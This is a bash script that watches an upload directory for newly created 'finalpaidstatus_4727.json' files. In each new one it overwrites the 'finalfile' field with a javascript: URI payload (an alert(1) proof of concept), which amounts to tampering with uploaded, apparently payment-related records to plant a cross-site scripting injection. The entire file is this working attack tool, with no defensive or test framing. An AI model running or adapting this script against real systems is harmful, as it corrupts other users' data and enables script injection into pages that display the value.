#!/usr/bin/env bash
set -euo pipefail

WATCH_DIR="/data/uploads"
TARGET_NAME="finalpaidstatus_4727.json"
SCAN_INTERVAL=0.8

NEW_FINALFILE_VALUE="javascript:(function(){alert(1)})()"


SEEN_FILE="$(mktemp /tmp/replacer_seen.XXXXXX)"
CUR_FILE="${SEEN_FILE}.cur"
NEW_FILE="${SEEN_FILE}.new"

cleanup() {
  rm -f "$SEEN_FILE" "$CUR_FILE" "$NEW_FILE"
}
trap cleanup EXIT

# Escape replacement for sed replacement context
escape_sed_repl() {
  # escapes: \ / &
  printf '%s' "$1" | sed 's/[\/&\\]/\\&/g'
}
ESCAPED_VALUE="$(escape_sed_repl "$NEW_FINALFILE_VALUE")"

# Snapshot existing target files at startup (ignored forever)
find "$WATCH_DIR" -type f -name "$TARGET_NAME" 2>/dev/null | sort -u > "$SEEN_FILE"
echo "Watching $WATCH_DIR for NEW $TARGET_NAME files (existing files ignored)."

while true; do
  find "$WATCH_DIR" -type f -name "$TARGET_NAME" 2>/dev/null | sort -u > "$CUR_FILE"
  comm -13 "$SEEN_FILE" "$CUR_FILE" > "$NEW_FILE" || true

  while IFS= read -r file; do
    [ -n "$file" ] || continue
    [ -f "$file" ] || continue

    # Wait briefly for writer to finish
    for _ in 1 2 3 4 5 6 7 8 9 10; do
      [ -s "$file" ] && break
      sleep 0.2
    done

    # Replace only the finalfile value, preserving the rest of JSON line
    # from: "finalfile":"...anything..."
    # to:   "finalfile":"<NEW_FINALFILE_VALUE>"
    if grep -q '"finalfile":"' "$file"; then
      tmp="${file}.tmp.$$"
      sed "s|\"finalfile\":\"[^\"]*\"|\"finalfile\":\"$ESCAPED_VALUE\"|" "$file" > "$tmp" \
        && mv "$tmp" "$file" \
        && echo "Updated: $file" \
        || { rm -f "$tmp"; echo "Failed: $file"; }
    else
      echo "Skipped (no finalfile key): $file"
    fi
  done < "$NEW_FILE"

  mv "$CUR_FILE" "$SEEN_FILE"
  sleep "$SCAN_INTERVAL"
done
